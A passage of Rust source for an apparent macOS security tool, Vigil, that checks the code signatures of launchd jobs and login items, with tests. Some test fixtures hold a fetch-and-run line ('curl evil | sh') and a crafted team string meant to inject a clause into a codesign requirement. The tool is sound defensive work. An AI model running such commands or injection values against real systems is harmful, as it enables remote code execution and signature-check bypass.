                format!("unreadable:{}", stamp.as_deref().unwrap_or(detail))
            }
            Self::Unsigned { sha256 } => format!("sha256:{sha256}"),
            Self::Invalid { cdhash, .. } => format!("invalid:{cdhash}"),
            Self::Apple => "apple".to_owned(),
            Self::AppleIssued {
                certificate: certificate @ (Certificate::DeveloperId | Certificate::AppStore),
                team: Some(team),
                ..
            } => format!("{}:{team}", certificate.name()),
            Self::AppleIssued { cdhash, .. }
            | Self::OtherIssuer { cdhash, .. }
            | Self::AdHoc { cdhash } => format!("cdhash:{cdhash}"),
        }
    }
}

/// Checks the signature of the file at `path`: what `codesign -d` shows, whether it
/// verifies, and who issued the certificate. The names `codesign -d` shows are the signer's
/// claim (a self-signed certificate can be called "Software Signing", and claim any team); only
/// a requirement check (`-R=anchor apple`) tests who issued it, and to which team.
fn signature(path: &Path, cancel: &Cancel) -> Result<Signature, InventoryError> {
    // launchd resolves a relative path against the job's `WorkingDirectory`, and a bare name on
    // its `PATH`, which `resolve` already did where it could; Vigil's own folder says nothing
    // about either.
    if !path.is_absolute() {
        if path.components().count() == 1 {
            return Ok(Signature::Missing);
        }
        let detail = "a relative path under a relative WorkingDirectory; not checked".to_owned();
        return Ok(Signature::Unreadable {
            detail,
            stamp: None,
        });
    }
    let metadata = match fs::metadata(path) {
        Ok(metadata) => metadata,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(Signature::Missing),
        Err(e) => {
            let detail = e.to_string();
            return Ok(Signature::Unreadable {
                detail,
                stamp: None,
            });
        }
    };
    let unreadable = |detail: String| Signature::Unreadable {
        detail,
        stamp: Some(stamp(&metadata)),
    };
    // A FIFO would block `shasum`, and a folder is no program.
    if !metadata.is_file() {
        return Ok(unreadable("not a regular file".to_owned()));
    }
    let Some(file) = path.to_str() else {
        return Ok(unreadable("the path is not UTF-8".to_owned()));
    };

    let shown = tool(CODESIGN, &["-d", "--verbose=4", file], cancel)?;
    if !shown.success {
        if shown.stderr.contains("code object is not signed at all") {
            let sha256 = sha256(file, cancel)?;
            return Ok(Signature::Unsigned { sha256 });
        }
        return Ok(unreadable(first_line(&shown.stderr)));
    }
    let shown = Shown::parse(&shown.stderr);
    // Every signed file has a code directory hash. Without one the output changed shape, and
    // the identities built on it would all be the same, so a dismissal would outlive any
    // replacement.
    let Some(cdhash) = shown.cdhash else {
        return Ok(unreadable("codesign -d printed no CDHash".to_owned()));
    };

    // `--ignore-resources`: for a bundle's main executable, `--verify` otherwise hashes every
    // resource of the bundle, which for Keynote took 1.43 s against 0.16 s (macOS 27.2), and a
    // sweep checks every launch item's program again. KnockKnock skips them the same way
    // (kSecCSDoNotValidateResources; docs/spec.md, Mac host checks, links its source).
    // Accepted: a changed file elsewhere in the bundle, such as a framework the program loads,
    // is not seen; that is for the dylib check to find.
    let verified = tool(
        CODESIGN,
        &["--verify", "--strict", "--ignore-resources", file],
        cancel,
    )?;
    if !verified.success {
        let detail = first_line(&verified.stderr);
        return Ok(Signature::Invalid { detail, cdhash });
    }
    if shown.adhoc {
        return Ok(Signature::AdHoc { cdhash });
    }
    if satisfies(file, "anchor apple", cancel)? {
        return Ok(Signature::Apple);
    }
    let Shown {
        authority, team, ..
    } = shown;
    match apple_certificate(file, team.as_deref(), cancel)? {
        Some(certificate) => Ok(Signature::AppleIssued {
            certificate,
            authority,
            team,
            cdhash,
        }),
        None => Ok(Signature::OtherIssuer {
            authority,
            team,
            cdhash,
        }),
    }
}

/// The kind of certificate Apple issued for the signature of `file`, issued to `team` when the
/// signature names one; `None` when Apple did not issue it, or not to that team.
fn apple_certificate(
    file: &str,
    team: Option<&str>,
    cancel: &Cancel,
) -> Result<Option<Certificate>, InventoryError> {
    let Some(to_team) = team_clause(team) else {
        return Ok(None);
    };
    for certificate in [
        Certificate::DeveloperId,
        Certificate::AppStore,
        Certificate::Other,
    ] {
        let requirement = format!("anchor apple generic{}{to_team}", certificate.clause());
        if satisfies(file, &requirement, cancel)? {
            return Ok(Some(certificate));
        }
    }
    Ok(None)
}

/// Whether the signature of `file` satisfies `requirement`, leaving out the bundle's resources
/// as `signature` does.
fn satisfies(file: &str, requirement: &str, cancel: &Cancel) -> Result<bool, InventoryError> {
    let requirement = format!("-R={requirement}");
    let args = ["--verify", "--ignore-resources", &requirement, file];
    Ok(tool(CODESIGN, &args, cancel)?.success)
}

/// The requirement clause that binds the leaf certificate to the claimed `team`: empty when
/// the signature claims none, `None` when the claim is no team ID. A team ID is ten letters and
/// digits; a claim of anything else is no team Apple issued a certificate to, and is kept out
/// of the requirement, whose language it could otherwise extend.
fn team_clause(team: Option<&str>) -> Option<String> {
    match team {
        Some(team) if is_team_id(team) => {
            Some(format!(" and certificate leaf[subject.OU] = \"{team}\""))
        }
        Some(_) => None,
        None => Some(String::new()),
    }
}

fn is_team_id(claim: &str) -> bool {
    claim.len() == 10 && claim.bytes().all(|b| b.is_ascii_alphanumeric())
}

/// A file's size and modification time, for an identity where its content cannot be read.
fn stamp(metadata: &fs::Metadata) -> String {
    format!(
        "{} bytes, modified {}.{:09}",
        metadata.size(),
        metadata.mtime(),
        metadata.mtime_nsec()
    )
}

/// What `codesign -d --verbose=4` prints on stderr, as far as a signature's identity goes.
#[derive(Debug, Default, PartialEq, Eq)]
struct Shown {
    /// The first `Authority=` line: the leaf certificate's name.
    authority: Option<String>,
    /// `TeamIdentifier=`, unless "not set".
    team: Option<String>,
    cdhash: Option<String>,
    /// Whether it printed `Signature=adhoc`.
    adhoc: bool,
}

impl Shown {
    fn parse(stderr: &str) -> Self {
        let mut shown = Self::default();
        for line in stderr.lines() {
            let Some((name, value)) = line.split_once('=') else {
                continue;
            };
            let value = value.trim().to_owned();
            match name {
                "Authority" if shown.authority.is_none() => shown.authority = Some(value),
                "TeamIdentifier" if value != "not set" => shown.team = Some(value),
                "CDHash" => shown.cdhash = Some(value),
                "Signature" => shown.adhoc = value == "adhoc",
                _ => {}
            }
        }
        shown
    }
}

/// The SHA-256 of `file`, in hex.
fn sha256(file: &str, cancel: &Cancel) -> Result<String, InventoryError> {
    let output = tool(SHASUM, &["-a", "256", "--", file], cancel)?;
    match digest(&output.stdout) {
        Some(digest) if output.success => Ok(digest.to_owned()),
        _ => Err(InventoryError::Command {
            command: output.command,
            detail: output.detail,
        }),
    }
}

/// The hex SHA-256 that `shasum -a 256` prints first, or `None` when the output is not one.
fn digest(stdout: &str) -> Option<&str> {
    let digest = stdout.split_whitespace().next()?;
    (digest.len() == 64 && digest.bytes().all(|b| b.is_ascii_hexdigit())).then_some(digest)
}

/// Runs a system tool that must be there: one that is not is an error, not a tool to skip.
fn tool(program: &str, args: &[&str], cancel: &Cancel) -> Result<Output, InventoryError> {
    command::run_any_status(program, args, cancel)?.ok_or_else(|| InventoryError::Spawn {
        command: program.to_owned(),
        source: io::Error::new(io::ErrorKind::NotFound, "not found; it ships with macOS"),
    })
}

fn first_line(text: &str) -> String {
    text.lines().next().unwrap_or_default().trim().to_owned()
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::PermissionsExt as _;

    use super::*;

    /// `codesign -d --verbose=4` of a Developer ID helper and of an ad-hoc build, trimmed to
    /// the lines read.
    const DEVELOPER_ID: &str = "Executable=/Library/PrivilegedHelperTools/com.docker.vmnetd
Identifier=com.docker.vmnetd
CDHash=0123abcd
Authority=Developer ID Application: Docker Inc (9BNSXJN65R)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
TeamIdentifier=9BNSXJN65R
";
    const AD_HOC: &str = "Identifier=hippius_mem-1057e8020cc77b7d
CDHash=967e47372e37cc02d67c5f3dfe1efdb62c719c67
Signature=adhoc
TeamIdentifier=not set
";

    #[test]
    fn display_gives_the_leaf_authority_team_and_hash() {
        assert_eq!(
            Shown::parse(DEVELOPER_ID),
            Shown {
                authority: Some("Developer ID Application: Docker Inc (9BNSXJN65R)".to_owned()),
                team: Some("9BNSXJN65R".to_owned()),
                cdhash: Some("0123abcd".to_owned()),
                adhoc: false,
            }
        );
        assert_eq!(
            Shown::parse(AD_HOC),
            Shown {
                authority: None,
                team: None,
                cdhash: Some("967e47372e37cc02d67c5f3dfe1efdb62c719c67".to_owned()),
                adhoc: true,
            }
        );
    }

    #[test]
    fn signatures_of_real_files() {
        let tmp = tempfile::tempdir().unwrap();
        let cancel = Cancel::new();

        assert_eq!(
            signature(Path::new("/bin/ls"), &cancel).unwrap(),
            Signature::Apple
        );
        assert_eq!(
            signature(&tmp.path().join("gone"), &cancel).unwrap(),
            Signature::Missing
        );
        assert!(matches!(
            signature(tmp.path(), &cancel).unwrap(),
            Signature::Unreadable { stamp: Some(_), .. }
        ));
        // Behind a folder this user may not enter, a file is unreadable, not missing.
        let locked = tmp.path().join("locked");
        fs::create_dir(&locked).unwrap();
        fs::write(locked.join("tool"), "x").unwrap();
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
        let behind = signature(&locked.join("tool"), &cancel).unwrap();
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o755)).unwrap();
        assert!(
            matches!(&behind, Signature::Unreadable { stamp: None, .. }),
            "{behind:?}"
        );

        let script = tmp.path().join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        assert_eq!(
            signature(&script, &cancel).unwrap(),
            Signature::Unsigned {
                sha256: "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03"
                    .to_owned()
            }
        );

        // An executable that cannot be read still runs; it is keyed by its size and time.
        fs::set_permissions(&script, fs::Permissions::from_mode(0o111)).unwrap();
        let hidden = signature(&script, &cancel).unwrap();
        fs::set_permissions(&script, fs::Permissions::from_mode(0o644)).unwrap();
        assert!(
            matches!(&hidden, Signature::Unreadable { stamp: Some(_), .. }),
            "{hidden:?}"
        );
        assert!(hidden.identity().starts_with("unreadable:6 bytes"));

        // A copy of an Apple binary keeps its signature, until a byte of its code changes.
        let copy = tmp.path().join("ls");
        let mut bytes = fs::read("/bin/ls").unwrap();
        fs::write(&copy, &bytes).unwrap();
        assert_eq!(signature(&copy, &cancel).unwrap(), Signature::Apple);
        let middle = bytes.len() / 2;
        bytes[middle] ^= 0xff;
        fs::write(&copy, &bytes).unwrap();
        let broken = signature(&copy, &cancel).unwrap();
        assert!(
            matches!(&broken, Signature::Invalid { cdhash, .. } if !cdhash.is_empty()),
            "{broken:?}"
        );
    }

    #[test]
    fn a_requirement_never_takes_a_claimed_team_that_is_not_a_team_id() {
        // `/bin/ls` is Apple's own, so no requirement for a team holds; a crafted team that
        // tried to close the quote and add a clause is not put into the requirement at all.
        let cancel = Cancel::new();
        assert_eq!(
            apple_certificate("/bin/ls", Some("X\" or anchor apple or \"Y"), &cancel).unwrap(),
            None,
            "a claim that is not a team ID is no team Apple issued to"
        );
        assert_eq!(
            apple_certificate("/bin/ls", None, &cancel).unwrap(),
            Some(Certificate::Other)
        );
        assert_eq!(
            apple_certificate("/bin/ls", Some("AAAAAAAAAA"), &cancel).unwrap(),
            None
        );
    }

    #[test]
    fn only_a_team_id_is_bound_into_a_requirement() {
        assert!(is_team_id("9BNSXJN65R"));
        for claim in ["9BNSXJN65", "9BNSXJN65RX", "9BNSXJN6\"R", ""] {
            assert!(!is_team_id(claim), "{claim:?}");
        }
        assert_eq!(team_clause(None).as_deref(), Some(""));
        assert_eq!(
            team_clause(Some("9BNSXJN65R")).as_deref(),
            Some(" and certificate leaf[subject.OU] = \"9BNSXJN65R\"")
        );
        assert_eq!(team_clause(Some("X\" or anchor apple or \"Y")), None);
    }

    #[test]
    fn a_digest_is_64_hex_digits_and_a_detail_its_first_line() {
        let hex = "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03";
        assert_eq!(digest(&format!("{hex}  /tmp/run.sh\n")), Some(hex));
        assert_eq!(digest(&hex[1..]), None, "63 digits");
        assert_eq!(digest(&"z".repeat(64)), None, "not hex");
        assert_eq!(digest(""), None);
        assert_eq!(first_line("  denied: x \nmore"), "denied: x");
        assert_eq!(first_line(""), "");
    }

    #[test]
    fn identities_follow_a_verified_team_or_the_content() {
        let issued = |certificate, team: &str, cdhash: &str| Signature::AppleIssued {
            certificate,
            authority: None,
            team: Some(team.to_owned()),
            cdhash: cdhash.to_owned(),
        };
        let developer_id = |team, cdhash| issued(Certificate::DeveloperId, team, cdhash);
        // A Developer ID update from the same team keeps the identity; another team does not.
        assert_eq!(
            developer_id("T1", "a").identity(),
            developer_id("T1", "b").identity()
        );
        assert_ne!(
            developer_id("T1", "a").identity(),
            developer_id("T2", "a").identity()
        );
        assert_ne!(
            developer_id("T1", "a").identity(),
            issued(Certificate::AppStore, "T1", "a").identity(),
            "the kind of certificate is part of it"
        );
        // A free development certificate is keyed by content, like a self-signed one.
        let development = |cdhash| issued(Certificate::Other, "T1", cdhash);
        assert_ne!(development("a").identity(), development("b").identity());
        let other = |cdhash: &str| Signature::OtherIssuer {
            authority: None,
            team: Some("T1".to_owned()),
            cdhash: cdhash.to_owned(),
        };
        assert_ne!(other("a").identity(), other("b").identity());
        assert_ne!(other("a").identity(), developer_id("T1", "a").identity());

        let unsigned = |sha256: &str| Signature::Unsigned {
            sha256: sha256.to_owned(),
        };
        assert_ne!(unsigned("a").identity(), unsigned("b").identity());
        let invalid = |cdhash: &str| Signature::Invalid {
            detail: String::new(),
            cdhash: cdhash.to_owned(),
        };
        assert_ne!(invalid("a").identity(), invalid("b").identity());
        let unreadable = |detail: &str, stamp: Option<&str>| Signature::Unreadable {
            detail: detail.to_owned(),
            stamp: stamp.map(str::to_owned),
        };
        assert_ne!(
            unreadable("a", None).identity(),
            unreadable("b", None).identity()
        );
        assert_eq!(
            unreadable("a", Some("1 bytes")).identity(),
            unreadable("b", Some("1 bytes")).identity(),
            "a stamp, when there is one, decides"
        );
        assert_ne!(Signature::Missing.identity(), Signature::Apple.identity());
    }

    /// Reads one item, whose checks must all run.
    fn read(kind: ItemKind, path: &Path) -> Item {
        let mut failures = Vec::new();
        let item = read_item(kind, path, &Cancel::new(), &mut failures);
        assert!(failures.is_empty(), "{failures:?}");
        item
    }

    fn plist(dir: &Path, name: &str, body: &str) -> PathBuf {
        let path = dir.join(name);
        fs::write(&path, plist_text(body)).unwrap();
        path
    }

    /// A property list whose dictionary holds `body`.
    fn plist_text(body: &str) -> String {
        format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>{body}\
             </dict></plist>\n"
        )
    }

    /// A job running `arguments`, as `<string>` elements.
    fn job(dir: &Path, name: &str, arguments: &[&str], extra: &str) -> Item {
        let strings = arguments.join("</string><string>");
        let strings = format!("<string>{strings}</string>");
        let body = format!("<key>ProgramArguments</key><array>{strings}</array>{extra}");
        read(ItemKind::LaunchDaemon, &plist(dir, name, &body))
    }

    #[test]
    fn an_item_names_its_program_script_and_shown_values_only() {
        let tmp = tempfile::tempdir().unwrap();
        let script = tmp.path().join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        let extra = "<key>Label</key><string>com.example.runner</string>\
             <key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>\
             <key>EnvironmentVariables</key><dict>\
             <key>API_TOKEN</key><string>secret</string>\
             <key>PATH</key><string>/tmp/bin:/usr/bin</string>\
             <key>DYLD_INSERT_LIBRARIES</key><string>/tmp/x.dylib</string></dict>";
        let item = job(
            tmp.path(),
            "runner.plist",
            &["sh", script.to_str().unwrap()],
            extra,
        );

        assert_eq!(item.label.as_deref(), Some("com.example.runner"));
        let program = item.program.as_ref().unwrap();
        assert_eq!(program.path, Path::new("/bin/sh"));
        assert_eq!(program.signature, Signature::Apple);
        let [ran] = &item.scripts[..] else {
            panic!("one script: {:?}", item.scripts);
        };
        assert_eq!(ran.path, script);
        assert!(matches!(ran.signature, Signature::Unsigned { .. }));
        assert!(item.keep_alive && !item.run_at_load && !item.disabled);
        assert_eq!(item.environment["API_TOKEN"], None);
        assert_eq!(
            item.environment["DYLD_INSERT_LIBRARIES"].as_deref(),
            Some("/tmp/x.dylib")
        );
        assert_eq!(
            item.environment["PATH"].as_deref(),
            Some("/tmp/bin:/usr/bin")
        );
        let line = serde_json::to_string(&item).unwrap();
        assert!(!line.contains("secret"), "{line}");
        assert!(line.contains(r#""kind":"launch_daemon""#), "{line}");
    }

    #[test]
    fn a_script_is_found_past_options_but_not_after_inline_code() {
        let tmp = tempfile::tempdir().unwrap();
        let script = tmp.path().join("x.py");
        fs::write(&script, "print(1)\n").unwrap();
        let file = script.to_str().unwrap();
        let ran = |arguments: &[&str]| -> Vec<PathBuf> {
            let item = job(tmp.path(), "s.plist", arguments, "");
            item.scripts.into_iter().map(|s| s.path).collect()
        };
        let just = |path: &Path| vec![path.to_owned()];

        assert_eq!(ran(&["/usr/bin/python3", "-u", file]), just(&script));
        assert_eq!(ran(&["/usr/bin/env", "python3", file]), just(&script));
        assert_eq!(ran(&["/bin/bash", "-l", file]), just(&script));
        assert_eq!(ran(&["/bin/bash", "--norc", file]), just(&script));
        assert_eq!(ran(&["/usr/bin/python3", "-OO", file]), just(&script));
        assert_eq!(
            ran(&["/usr/bin/osascript", "-l", "JavaScript", file]),
            just(&script)
        );
        // Through `env`, both the interpreter it starts and that interpreter's script.
        assert_eq!(
            ran(&["/usr/bin/env", "/opt/x/python3", "-u", file]),
            [PathBuf::from("/opt/x/python3"), script.clone()]
        );
        assert_eq!(
            ran(&["/usr/bin/env", "/opt/x/python3", "-c", "1"]),
            just(Path::new("/opt/x/python3"))
        );
        // Any other interpreter runs a file named like one as a script, so it is checked.
        assert_eq!(ran(&["/bin/sh", "/opt/x/sh"]), just(Path::new("/opt/x/sh")));
        // Only `env` chains: `sh` runs `/opt/x/python3` as a shell script, passing it `file`.
        assert_eq!(
            ran(&["/bin/sh", "/opt/x/python3", file]),
            just(Path::new("/opt/x/python3"))
        );
        assert_eq!(ran(&["/bin/sh", "-c", file]), Vec::<PathBuf>::new());
        assert_eq!(ran(&["/bin/bash", "-lc", file]), Vec::<PathBuf>::new());
        assert_eq!(
            ran(&["/bin/ls", file]),
            Vec::<PathBuf>::new(),
            "not an interpreter"
        );
        assert!(is_interpreter(Path::new("/opt/homebrew/bin/python3.12")));
        assert!(!is_interpreter(Path::new("/bin/ls")));
    }

    #[test]
    fn the_identity_changes_with_anything_that_changes_what_runs() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path();
        let script = dir.join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        let file = script.to_str().unwrap();
        let identity =
            |arguments: &[&str], extra: &str| job(dir, "i.plist", arguments, extra).identity();
        let base = identity(&["/bin/sh", file], "");

        assert_eq!(base, identity(&["/bin/sh", file], ""));
        assert_ne!(base, identity(&["/bin/zsh", file], ""), "another program");
        assert_ne!(base, identity(&["/bin/sh", "-x", file], ""), "arguments");
        let as_nobody = "<key>UserName</key><string>nobody</string>";
        assert_ne!(base, identity(&["/bin/sh", file], as_nobody), "the user");
        let at_load = "<key>RunAtLoad</key><true/>";
        assert_ne!(base, identity(&["/bin/sh", file], at_load), "run at load");
        let disabled = "<key>Disabled</key><true/>";
        assert_ne!(base, identity(&["/bin/sh", file], disabled), "disabled");
        let dyld = "<key>EnvironmentVariables</key><dict>\
                    <key>DYLD_INSERT_LIBRARIES</key><string>/tmp/a.dylib</string></dict>";
        assert_ne!(base, identity(&["/bin/sh", file], dyld), "DYLD_");
        // `true` ignores `-c` and `sh` runs it: the same arguments under another program.
        assert_ne!(
            identity(&["/usr/bin/true", "-c", "curl evil"], ""),
            identity(&["/bin/sh", "-c", "curl evil"], "")
        );
        fs::write(&script, "curl evil | sh\n").unwrap();
        assert_ne!(base, identity(&["/bin/sh", file], ""), "the script");
    }

    #[test]
    fn a_property_list_that_cannot_be_read_is_an_item_with_its_error() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("broken.plist");
        fs::write(&path, "not a plist").unwrap();
        let item = read(ItemKind::UserLaunchAgent, &path);
        let error = item.error.as_deref().unwrap();
        assert!(error.starts_with("not a launchd property list"), "{error}");
        assert!(item.program.is_none());
        // Changing it changes the identity, so a dismissed one shows again.
        let before = item.identity();
        fs::write(&path, "still not a plist").unwrap();
        assert_ne!(before, read(ItemKind::UserLaunchAgent, &path).identity());

        // A link or a FIFO is refused when opened, so a swap cannot block the read.
        let link = tmp.path().join("link.plist");
        std::os::unix::fs::symlink(&path, &link).unwrap();
        let fifo = tmp.path().join("fifo.plist");
        paths::releasing_fifo(&fifo);
        for refused in [link, fifo] {
            let item = read(ItemKind::UserLaunchAgent, &refused);
            assert!(
                item.error
                    .as_deref()
                    .unwrap()
                    .starts_with("not a regular file"),
                "{item:?}"
            );
        }

        let empty = plist(tmp.path(), "empty.plist", "");
        let item = read(ItemKind::LaunchAgent, &empty);
        assert!(item.error.is_none() && item.program.is_none());

        // A property list of exactly the limit is read; one byte more is refused as too large.
        let sized = |name: &str, size: u64| {
            let path = plist(tmp.path(), name, "<key>Label</key><string>big</string>");
            let mut text = fs::read_to_string(&path).unwrap();
            let pad = usize::try_from(size).unwrap() - text.len();
            text.insert_str(text.len() - "</plist>\n".len(), &" ".repeat(pad));
            fs::write(&path, text).unwrap();
            read(ItemKind::LaunchAgent, &path)
        };
        let at_limit = sized("limit.plist", PLIST_LIMIT);
        assert_eq!(at_limit.error, None);
        assert_eq!(at_limit.label.as_deref(), Some("big"));
        let over = sized("over.plist", PLIST_LIMIT + 1);
        let error = over.error.unwrap();
        assert!(error.starts_with("more than the 1048576 bytes"), "{error}");
    }

    #[test]
    fn programs_resolve_as_launchd_resolves_them() {
        let tmp = tempfile::tempdir().unwrap();
        let item = job(tmp.path(), "old.plist", &["/nonexistent/old-app"], "");
        assert_eq!(item.program.unwrap().signature, Signature::Missing);

        // A relative path is under the job's WorkingDirectory, never Vigil's own folder.
        let extra = format!(
            "<key>WorkingDirectory</key><string>{}</string>",
            tmp.path().display()
        );
        let item = job(tmp.path(), "rel.plist", &["bin/tool"], &extra);
        assert_eq!(item.program.unwrap().path, tmp.path().join("bin/tool"));
        // Without one, launchd starts the job in `/`.
        let item = job(tmp.path(), "rel.plist", &["bin/tool"], "");
        assert_eq!(item.program.unwrap().path, Path::new("/bin/tool"));
        let relative = "<key>WorkingDirectory</key><string>here</string>";
        let item = job(tmp.path(), "rel.plist", &["bin/tool"], relative);
        assert!(matches!(
            item.program.unwrap().signature,
            Signature::Unreadable { detail, .. } if detail.starts_with("a relative path")
        ));

        assert_eq!(resolve("ls", None), Path::new("/bin/ls"));
        assert_eq!(resolve("/opt/x", Some("/tmp")), Path::new("/opt/x"));
        assert_eq!(resolve("no-such-tool", None), Path::new("no-such-tool"));
    }

    #[test]
    fn folders_that_are_missing_are_empty_and_unlistable_ones_are_noted() {
        let tmp = tempfile::tempdir().unwrap();
        let locked = tmp.path().join("locked");
        fs::create_dir(&locked).unwrap();
        plist(&locked, "a.plist", "");
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
        let open = tmp.path().join("open");
        fs::create_dir(&open).unwrap();
        plist(&open, "b.plist", "");
        fs::write(open.join(".DS_Store"), "").unwrap();

        let mut inventory = Inventory::default();
        let folders = [
            (ItemKind::LaunchAgent, tmp.path().join("missing")),
            (ItemKind::LaunchAgent, locked.clone()),
            (ItemKind::UserLaunchAgent, open.clone()),
        ];
        let items = launch_items(&mut inventory, &folders, &Cancel::new());
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o755)).unwrap();

        let paths: Vec<&str> = items.iter().map(|i| i.path.as_str()).collect();
        assert_eq!(paths, [open.join("b.plist").to_str().unwrap()]);
        // A folder this user may not read is a note, as everywhere in the inventory: it stays
        // so on every sweep, and counting it would keep this Mac from ever being clear.
        assert_eq!(inventory.problems.len(), 1, "{:?}", inventory.problems);
        assert!(inventory.failed.is_empty());

        // A cancelled read stops before the next item and counts as not checked.
        let cancel = Cancel::new();
        cancel.cancel();
        let mut inventory = Inventory::default();
        let folders = [(ItemKind::UserLaunchAgent, open.clone())];
        assert!(launch_items(&mut inventory, &folders, &cancel).is_empty());
        let path = open.to_string_lossy().into_owned();
        assert!(
            inventory
                .failed
                .contains(&InventorySource::LaunchFolder { path })
        );
    }

    /// An app bundle at `path` whose `Info.plist` names `executable`, with that file.
    fn app(path: &Path, executable: &str) {
        let contents = path.join("Contents");
        fs::create_dir_all(contents.join("MacOS")).unwrap();
        let body = format!("<key>CFBundleExecutable</key><string>{executable}</string>");
        plist(&contents, "Info.plist", &body);
        fs::write(contents.join("MacOS").join(executable), "#!/bin/sh\n").unwrap();
    }

    #[test]
    fn what_apps_registered_is_read_with_its_program_and_switches() {
        use background::tests::Archiver;
        use background::tests::Record;

        let tmp = tempfile::tempdir().unwrap();
        let outer = tmp.path().join("Outer App.app");
        app(&outer, "Outer");
        let helper = outer.join("Contents/Library/LoginItems/Helper.app");
        app(&helper, "Helper");
        let agents = outer.join("Contents/Library/LaunchAgents");
        fs::create_dir_all(&agents).unwrap();
        let body = "<key>Label</key><string>com.example.agent</string>\
             <key>BundleProgram</key><string>Contents/MacOS/Outer</string>\
             <key>ProgramArguments</key><array/>";
        plist(&agents, "com.example.agent.plist", body);
        let broken = tmp.path().join("Broken.app");
        fs::create_dir_all(broken.join("Contents")).unwrap();

        let url = |path: &Path| format!("file://{}/", path.display()).replace(' ', "%20");
        let (outer_url, broken_url) = (url(&outer), url(&broken));
        let gone_url = url(&tmp.path().join("Gone.app"));
        let record = |bits, identifier, url: Option<&'static str>| Record {
            bits,
            disposition: 0b11,
            identifier,
            name: Some("Recorded"),
            url,
            container: Some("2.outer"),
        };
        let records = [
            Record {
                disposition: 0b10,
                container: None,
                url: Some(&outer_url),
                ..record(0x2, "2.outer", None)
            },
            record(
                0x4,
                "4.helper",
                Some("Contents/Library/LoginItems/Helper.app"),
            ),
            Record {
                disposition: 0b01,
                ..record(
                    0x8,
                    "8.agent",
                    Some("Contents/Library/LaunchAgents/com.example.agent.plist"),
                )
            },
            Record {
                container: None,
                url: Some(&gone_url),
                ..record(0x2, "2.gone", None)
            },
            Record {
                container: None,
                url: Some(&broken_url),
                ..record(0x2, "2.broken", None)
            },
        ];
        let folder = tmp.path().join("btm");
        fs::create_dir(&folder).unwrap();
        let archive = Archiver::user_file(&records);
        background::tests::write(&folder.join("BackgroundItems-v18-a.btm"), &archive);
        // The same records for another user give each item once.
        background::tests::write(&folder.join("BackgroundItems-v18-b.btm"), &archive);

        let mut inventory = Inventory::default();
        let items = background_items(&mut inventory, &folder, &Cancel::new());
        assert!(inventory.problems.is_empty(), "{:?}", inventory.problems);
        let [login, agent, gone, unread] = &items[..] else {
            panic!("four items: {items:#?}");
        };

        assert_eq!(login.kind, ItemKind::LoginItem);
        assert_eq!(login.path, helper.to_str().unwrap());
        let program = login.program.as_ref().unwrap();
        assert_eq!(program.path, helper.join("Contents/MacOS/Helper"));
        assert!(matches!(program.signature, Signature::Unsigned { .. }));
        assert!(login.run_at_load);
        assert_eq!(login.label.as_deref(), Some("Recorded"));

        assert_eq!(agent.kind, ItemKind::AppLaunchAgent);
        assert_eq!(agent.label.as_deref(), Some("com.example.agent"));
        let program = agent.program.as_ref().unwrap();
        assert_eq!(
            program.path,
            outer.join("Contents/MacOS/Outer"),
            "BundleProgram"
        );
        let line = serde_json::to_string(agent).unwrap();
        assert!(
            line.contains(r#""login_items":{"enabled":true,"allowed":false}"#),
            "{line}"
        );

        assert_eq!(gone.kind, ItemKind::OpenAtLogin);
        let program = gone.program.as_ref().unwrap();
        assert_eq!(program.path, tmp.path().join("Gone.app"));
        assert_eq!(program.signature, Signature::Missing);

        assert_eq!(unread.path, broken.to_str().unwrap());
        let error = unread.error.as_deref().unwrap();
        assert!(error.starts_with("cannot read its Info.plist"), "{error}");
        assert!(unread.login_items.is_some());
    }

    #[test]
    fn the_same_record_for_several_users_is_one_item() {
        use background::tests::Archiver;
        use background::tests::Record;

        let tmp = tempfile::tempdir().unwrap();
        let app = tmp.path().join("A.app");
        let url = format!("file://{}/", app.display());
        let record = |disposition, identifier, url| Record {
            bits: 0x2,
            disposition,
            identifier,
            name: None,
            url,
            container: None,
        };
        let folder = tmp.path().join("btm");
        fs::create_dir(&folder).unwrap();
        // It runs for the second user only, which is what counts. A login item (kept whatever
        // its switches, unlike an app) is enabled for one user and allowed for the other, so it
        // runs for neither, and the first is kept.
        let other = tmp.path().join("B.app");
        let other_url = format!("file://{}/", other.display());
        let helper = |disposition| Record {
            bits: 0x4,
            ..record(disposition, "4.b", Some(other_url.as_str()))
        };
        // The same unplaced record for both users is one item too, merged the same way.
        let unplaced = |disposition| Record {
            bits: 0x4,
            ..record(disposition, "4.x", None)
        };
        let first = [
            record(0b01, "2.a", Some(url.as_str())),
            helper(0b01),
            unplaced(0b01),
        ];
        let second = [
            record(0b11, "2.a", Some(url.as_str())),
            helper(0b10),
            unplaced(0b11),
            Record {
                bits: 0x4,
                ..record(0b11, "4.y", None)
            },
        ];
        let write = |name: &str, records: &[Record<'_>]| {
            let path = folder.join(name);
            background::tests::write(&path, &Archiver::user_file(records));
        };
        write("BackgroundItems-v18-a.btm", &first);
        write("BackgroundItems-v18-b.btm", &second);

        let mut inventory = Inventory::default();
        let items = background_items(&mut inventory, &folder, &Cancel::new());
        let shown: Vec<(&str, bool, bool)> = items
            .iter()
            .map(|item| {
                let switches = item.login_items.unwrap();
                (item.path.as_str(), switches.enabled, switches.allowed)
            })
            .collect();
        assert_eq!(
            shown,
            [
                (app.to_str().unwrap(), true, true),
                (other.to_str().unwrap(), true, false),
                ("(unplaced) 4.x: (no location)", true, true),
                ("(unplaced) 4.y: (no location)", true, true),
            ]
        );
    }

    #[test]
    fn an_app_whose_executable_cannot_be_found_is_kept_with_why() {
        let tmp = tempfile::tempdir().unwrap();
